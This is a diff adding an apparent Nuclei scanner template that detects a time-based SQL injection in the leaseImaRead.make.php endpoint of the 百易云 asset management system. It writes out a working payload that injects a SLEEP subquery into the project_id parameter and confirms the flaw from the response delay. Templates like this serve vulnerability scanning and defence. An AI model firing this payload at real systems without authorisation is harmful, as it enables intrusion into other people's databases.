@@ -1,0 +1,31 @@
+id: baiyiyun-leaseimaread-make-sqli
+
+info:
+  name: 百易云资产管理运营系统 leaseImaRead.make SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /adminx/leaseImaRead.make.php?act=make&project_id=1%20AND%20(SELECT%201337%20FROM%20(SELECT(SLEEP({{t1}})))xxxx) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "生成成功"
+        part: body
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
